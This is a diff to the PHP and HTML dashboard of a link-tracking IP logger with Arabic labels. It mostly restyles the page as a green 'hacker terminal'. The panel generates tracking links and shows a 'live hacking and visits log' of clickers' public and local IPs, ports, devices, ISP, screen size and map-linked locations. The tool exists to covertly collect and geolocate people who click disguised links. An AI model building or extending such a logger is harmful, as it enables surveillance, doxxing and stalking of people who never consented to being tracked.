@@ -143,7 +143,8 @@ function get_ip_details($ip) {
         return [
             'country' => $data['country'] ?? 'Unknown',
             'city' => $data['city'] ?? 'Unknown',
-            'lat' => $data['lat'] ?? '36.7538', 'lon' =>$data['lon'] ?? '3.0588',
+            'lat' => $data['lat'] ?? '36.7538', 
+            'lon' =>$data['lon'] ?? '3.0588',
             'isp' => parse_isp($data['isp'] ?? '',$data['org'] ?? '')
         ];
     }
@@ -151,7 +152,7 @@ function get_ip_details($ip) {
 }
 
 // 1. معالجة التوجيه
-$og_title = "System Link";
+$og_title = "Secure Terminal";
 $og_image = "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60";
 
 if (isset($_GET['r'])) {
@@ -226,63 +227,66 @@ if (!empty($filter_code)) {
 
     <style>
         :root {
-            --bg-main: #090d16;
-            --bg-card: #111827;
-            --border-color: #1f2937;
-            --text-main: #f3f4f6;
-            --text-muted: #9ca3af;
-            --accent: #2563eb;
-            --accent-hover: #1d4ed8;
-            --success: #059669;
+            --bg-main: #020408;
+            --bg-card: #080d16;
+            --border-color: #0f2218;
+            --text-main: #00ff66;
+            --text-muted: #4e8062;
+            --accent: #00cc52;
+            --accent-hover: #00993d;
+            --success: #00ff66;
         }
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: Inter, system-ui, -apple-system, sans-serif; }
-        body { background-color: var(--bg-main); color: var(--text-main); padding: 30px 15px; line-height: 1.6; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Courier New', Courier, monospace; }
+        body { background-color: var(--bg-main); color: var(--text-main); padding: 30px 15px; line-height: 1.6; background-image: radial-gradient(circle at 50% 50%, #051910 0%, #020408 100%); min-height: 100vh; }
         .wrapper { max-width: 1200px; margin: 0 auto; display: grid; gap: 24px; }
         
-        header { display: flex; justify-content: space-between; align-items: center; background: var(--bg-card); border: 1px solid var(--border-color); padding: 20px 25px; border-radius: 12px; }
-        header h1 { font-size: 18px; font-weight: 600; color: #fff; letter-spacing: -0.5px; }
+        header { display: flex; justify-content: space-between; align-items: center; background: var(--bg-card); border: 1px solid var(--border-color); padding: 20px 25px; border-radius: 6px; box-shadow: 0 0 15px rgba(0, 255, 102, 0.05); }
+        header h1 { font-size: 16px; font-weight: bold; color: #00ff66; text-transform: uppercase; letter-spacing: 1px; }
         .metrics { display: flex; gap: 15px; }
-        .metric-card { background: #030712; border: 1px solid var(--border-color); padding: 8px 16px; border-radius: 8px; text-align: center; }
-        .metric-card span { display: block; font-size: 11px; color: var(--text-muted); text-transform: uppercase; }
-        .metric-card strong { font-size: 15px; color: #fff; }
+        .metric-card { background: #020408; border: 1px solid var(--border-color); padding: 8px 16px; border-radius: 4px; text-align: center; }
+        .metric-card span { display: block; font-size: 10px; color: var(--text-muted); text-transform: uppercase; }
+        .metric-card strong { font-size: 15px; color: #00ff66; }
 
-        .section-box { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 12px; padding: 25px; box-shadow: 0 4px 20px rgba(0,0,0,0.4); }
-        h2 { font-size: 15px; font-weight: 600; margin-bottom: 16px; color: #e5e7eb; border-bottom: 1px solid var(--border-color); padding-bottom: 10px; }
+        .section-box { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 6px; padding: 25px; box-shadow: 0 4px 20px rgba(0,0,0,0.8); }
+        h2 { font-size: 14px; font-weight: bold; margin-bottom: 16px; color: #00ff66; border-bottom: 1px solid var(--border-color); padding-bottom: 10px; text-transform: uppercase; letter-spacing: 1px; }
 
         .form-row { display: flex; gap: 10px; position: relative; }
-        input[type="text"] { flex: 1; background: #030712; border: 1px solid var(--border-color); border-radius: 8px; padding: 12px 14px; color: #fff; font-size: 14px; outline: none; transition: border 0.2s; }
-        input[type="text"]:focus { border-color: var(--accent); }
+        input[type="text"] { flex: 1; background: #020408; border: 1px solid var(--border-color); border-radius: 4px; padding: 12px 14px; color: #00ff66; font-size: 14px; outline: none; transition: border 0.2s; font-family: monospace; }
+        input[type="text"]:focus { border-color: var(--accent); box-shadow: 0 0 8px rgba(0,255,102,0.2); }
         
-        .btn { background: var(--accent); color: white; border: none; padding: 0 20px; border-radius: 8px; font-weight: 500; cursor: pointer; transition: background 0.2s; text-decoration: none; display: inline-flex; align-items: center; justify-content: center; font-size: 14px; white-space: nowrap; height: 46px; }
-        .btn:hover { background: var(--accent-hover); }
-        .btn-success { background: var(--success); }
-        .btn-success:hover { background: #047857; }
-        .btn-danger { background: #dc2626; }
-        .btn-danger:hover { background: #b91c1c; }
-        .btn-secondary { background: #374151; }
-        .btn-secondary:hover { background: #4b5563; }
+        .btn { background: var(--accent); color: #020408; border: none; padding: 0 20px; border-radius: 4px; font-weight: bold; cursor: pointer; transition: background 0.2s; text-decoration: none; display: inline-flex; align-items: center; justify-content: center; font-size: 13px; white-space: nowrap; height: 46px; text-transform: uppercase; }
+        .btn:hover { background: var(--accent-hover); box-shadow: 0 0 10px rgba(0,255,102,0.4); }
+        .btn-danger { background: #990000; color: #fff; }
+        .btn-danger:hover { background: #cc0000; }
+        .btn-secondary { background: #0f2218; color: #00ff66; border: 1px solid var(--border-color); }
+        .btn-secondary:hover { background: #183827; }
 
-        .input-action-group { position: relative; flex: 1; display: flex; }
-        .paste-btn { position: absolute; left: 10px; top: 50%; transform: translateY(-50%); background: #1f2937; color: var(--text-muted); border: none; padding: 6px 12px; font-size: 12px; border-radius: 6px; cursor: pointer; }
-        .paste-btn:hover { color: #fff; background: #374151; }
+        .input-action-group { position: relative; flex: 1; display: flex; gap: 6px; }
+        .action-btn-inline { background: #0f2218; color: #00ff66; border: 1px solid var(--border-color); padding: 0 12px; font-size: 12px; border-radius: 4px; cursor: pointer; height: 46px; font-family: monospace; }
+        .action-btn-inline:hover { background: #183827; }
 
-        .result-panel { background: #030712; border: 1px solid var(--border-color); padding: 16px; border-radius: 8px; margin-top: 15px; }
-        .result-panel label { display: block; font-size: 12px; color: var(--text-muted); margin-bottom: 6px; }
+        .result-panel { background: #020408; border: 1px solid var(--border-color); padding: 16px; border-radius: 4px; margin-top: 15px; }
+        .result-panel label { display: block; font-size: 11px; color: var(--text-muted); margin-bottom: 6px; text-transform: uppercase; }
         .link-flex { display: flex; gap: 8px; }
+
+        /* تكبير كود التتبع واضرازه بشكل اختراقي بارز */
+        .big-tracking-code-box { background: #020408; border: 2px dashed #00ff66; padding: 15px; border-radius: 6px; text-align: center; margin-top: 15px; box-shadow: inset 0 0 10px rgba(0,255,102,0.1); }
+        .big-tracking-code-box span { font-size: 11px; color: var(--text-muted); display: block; text-transform: uppercase; margin-bottom: 5px; }
+        .big-code-val { font-size: 28px; font-weight: bold; color: #00ff66; letter-spacing: 3px; font-family: monospace; text-shadow: 0 0 10px rgba(0,255,102,0.5); }
 
         .toolbar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; flex-wrap: wrap; gap: 10px; }
         .search-form { display: flex; gap: 8px; max-width: 350px; width: 100%; }
 
-        .table-wrap { overflow-x: auto; border: 1px solid var(--border-color); border-radius: 8px; }
-        table { width: 100%; border-collapse: collapse; text-align: right; font-size: 13px; min-width: 1000px; }
-        th { background: #030712; color: var(--text-muted); padding: 12px 15px; border-bottom: 1px solid var(--border-color); font-weight: 500; white-space: nowrap; }
-        td { padding: 12px 15px; border-bottom: 1px solid var(--border-color); color: #e5e7eb; white-space: nowrap; }
-        tr:hover { background: rgba(31, 41, 55, 0.3); }
+        .table-wrap { overflow-x: auto; border: 1px solid var(--border-color); border-radius: 4px; }
+        table { width: 100%; border-collapse: collapse; text-align: right; font-size: 12px; min-width: 1000px; }
+        th { background: #020408; color: var(--text-muted); padding: 12px 15px; border-bottom: 1px solid var(--border-color); font-weight: bold; white-space: nowrap; text-transform: uppercase; }
+        td { padding: 12px 15px; border-bottom: 1px solid var(--border-color); color: #00ff66; white-space: nowrap; }
+        tr:hover { background: rgba(15, 34, 24, 0.4); }
         
-        .code-badge { background: rgba(5, 150, 105, 0.1); color: #34d399; padding: 4px 8px; border-radius: 4px; font-family: monospace; font-size: 12px; border: 1px solid rgba(5, 150, 105, 0.2); }
-        .ip-public { font-family: monospace; color: #60a5fa; }
-        .ip-local { font-family: monospace; color: #34d399; }
-        .port-tag { font-family: monospace; color: #f43f5e; background: rgba(244, 63, 94, 0.1); padding: 2px 6px; border-radius: 4px; }
+        .code-badge { background: rgba(0, 255, 102, 0.1); color: #00ff66; padding: 4px 8px; border-radius: 3px; font-family: monospace; font-size: 12px; border: 1px solid var(--border-color); }
+        .ip-public { font-family: monospace; color: #00cc52; }
+        .ip-local { font-family: monospace; color: #33ff99; }
+        .port-tag { font-family: monospace; color: #ff3333; background: rgba(255, 51, 51, 0.1); padding: 2px 6px; border-radius: 3px; }
     </style>
     <script>
         function getLocalIP(callback) {
@@ -336,11 +340,13 @@ if (!empty($filter_code)) {
         function copyText(text, btnElement) {
             navigator.clipboard.writeText(text).then(() => {
                 const original = btnElement.innerText;
-                btnElement.innerText = "تم النسخ";
-                btnElement.style.background = "#059669";
+                btnElement.innerText = "[تم النسخ]";
+                btnElement.style.background = "#00ff66";
+                btnElement.style.color = "#020408";
                 setTimeout(() => {
                     btnElement.innerText = original;
                     btnElement.style.background = "";
+                    btnElement.style.color = "";
                 }, 2000);
             });
         }
@@ -349,10 +355,10 @@ if (!empty($filter_code)) {
 <body>
     <div class="wrapper">
         
-        <!-- الهيدر والمعلومات -->
+        <!-- الهيدر -->
         <header>
             <div>
-                <h1>لوحة التحكم والتشخيص المتقدم</h1>
+                <h1>[ SECURE TERMINAL // V2.0 ]</h1>
             </div>
             <div class="metrics">
                 <div class="metric-card">
@@ -361,20 +367,20 @@ if (!empty($filter_code)) {
                 </div>
                 <div class="metric-card">
                     <span>إجمالي الزيارات</span>
-                    <strong style="color: #34d399;"><?php echo $total_visits; ?></strong>
+                    <strong style="color: #00ff66;"><?php echo $total_visits; ?></strong>
                 </div>
             </div>
         </header>
 
         <!-- قسم توليد الروابط -->
         <section class="section-box">
-            <h2>إنشاء رابط تعقب جديد</h2>
+            <h2>> توليد رابط تعقب جديد</h2>
             <form method="POST" class="form-row">
                 <div class="input-action-group">
+                    <button type="button" class="action-btn-inline" onclick="pasteClipboard('target_url')">لصق</button>
                     <input type="text" name="target_url" placeholder="أدخل الرابط المستهدف هنا..." required>
-                    <button type="button" class="paste-btn" onclick="pasteClipboard('target_url')">لصق</button>
                 </div>
-                <button type="submit" name="create" class="btn">توليد الرابط</button>
+                <button type="submit" name="create" class="btn">تنفيذ التوليد</button>
             </form>
 
             <?php if (!empty($generated_link)): ?>
@@ -384,9 +390,16 @@ if (!empty($filter_code)) {
                         <input type="text" readonly value="<?php echo htmlspecialchars($generated_link); ?>">
                         <button type="button" class="btn btn-secondary" onclick="copyText('<?php echo htmlspecialchars($generated_link); ?>', this)">نسخ الرابط</button>
                     </div>
-                    <div style="display: flex; justify-content: space-between; align-items: center; margin-top: 12px; font-size: 13px;">
-                        <span style="color: var(--text-muted);">كود التعقب: <strong class="code-badge"><?php echo htmlspecialchars($tracking_code); ?></strong></span>
-                        <a href="/?track=<?php echo htmlspecialchars($tracking_code); ?>" style="color: #60a5fa; text-decoration: none;">عرض إحصائيات هذا الكود فقط ←</a>
+                    
+                    <!-- كود التتبع المكبر والبارز -->
+                    <div class="big-tracking-code-box">
+                        <span>كود التعقب الخاص بالرابط</span>
+                        <div class="big-code-val"><?php echo htmlspecialchars($tracking_code); ?></div>
+                        <button type="button" class="btn btn-secondary" style="margin-top: 10px; height: 36px; font-size: 11px;" onclick="copyText('<?php echo htmlspecialchars($tracking_code); ?>', this)">نسخ الكود حصرياً</button>
+                    </div>
+
+                    <div style="display: flex; justify-content: flex-end; align-items: center; margin-top: 12px; font-size: 12px;">
+                        <a href="/?track=<?php echo htmlspecialchars($tracking_code); ?>" style="color: #00ff66; text-decoration: none;">[ تصفية السجلات لهذا الكود فقط ] →</a>
                     </div>
                 </div>
             <?php endif; ?>
@@ -395,12 +408,13 @@ if (!empty($filter_code)) {
         <!-- قسم السجلات الحية -->
         <section class="section-box">
             <div class="toolbar">
-                <h2>سجلات الزيارات الحية</h2>
+                <h2>> سجلات الاختراق والزيارات الحية</h2>
                 <form method="GET" class="search-form">
-                    <input type="text" name="track" placeholder="بحث بكود التعقب..." value="<?php echo htmlspecialchars($filter_code); ?>">
+                    <button type="button" class="action-btn-inline" onclick="pasteClipboard('track')" style="height: 42px;">لصق</button>
+                    <input type="text" name="track" placeholder="بحث بكود التعقب..." value="<?php echo htmlspecialchars($filter_code); ?>" style="height: 42px;">
                     <button type="submit" class="btn" style="height: 42px;">بحث</button>
                     <?php if(!empty($filter_code)): ?>
-                        <a href="/" class="btn btn-danger" style="height: 42px; text-decoration:none;">إلغاء</a>
+                        <a href="/" class="btn btn-danger" style="height: 42px; text-decoration:none; display:flex; align-items:center;">إلغاء</a>
                     <?php endif; ?>
                 </form>
             </div>
@@ -434,14 +448,14 @@ if (!empty($filter_code)) {
                                 <td class="ip-public"><?php echo htmlspecialchars($log['public_ip'] ?? 'N/A'); ?></td>
                                 <td class="ip-local"><?php echo htmlspecialchars($log['local_ip'] ?? 'N/A'); ?></td>
                                 <td><span class="port-tag"><?php echo htmlspecialchars($log['port'] ?? 'N/A'); ?></span></td>
-                                <td style="font-weight: 500; color: #fbbf24;"><?php echo htmlspecialchars($log['device_info']); ?></td>
+                                <td style="font-weight: bold; color: #00ff99;"><?php echo htmlspecialchars($log['device_info']); ?></td>
                                 <td>
                                     <span><?php echo htmlspecialchars($log['country']); ?> / <?php echo htmlspecialchars($log['city']); ?></span><br>
-                                    <a href="https://www.google.com/maps?q=<?php echo htmlspecialchars($log['lat']); ?>,<?php echo htmlspecialchars($log['lon']); ?>" target="_blank" style="font-size: 11px; color: #34d399; text-decoration: none;">عرض الخريطة ↗</a>
+                                    <a href="https://www.google.com/maps?q=<?php echo htmlspecialchars($log['lat']); ?>,<?php echo htmlspecialchars($log['lon']); ?>" target="_blank" style="font-size: 11px; color: #00cc52; text-decoration: none;">[ خريطة جوجل ↗ ]</a>
                                 </td>
-                                <td style="color: #38bdf8;"><?php echo htmlspecialchars($log['isp']); ?></td>
+                                <td style="color: #00ff66;"><?php echo htmlspecialchars($log['isp']); ?></td>
                                 <td><?php echo htmlspecialchars($log['screen_res']); ?></td>
-                                <td style="color: #34d399; font-weight: 500;"><?php echo htmlspecialchars($log['created_at']); ?></td>
+                                <td style="color: #00ff66; font-weight: bold;"><?php echo htmlspecialchars($log['created_at']); ?></td>
                             </tr>
                             <?php endforeach; ?>
                         <?php endif; ?>
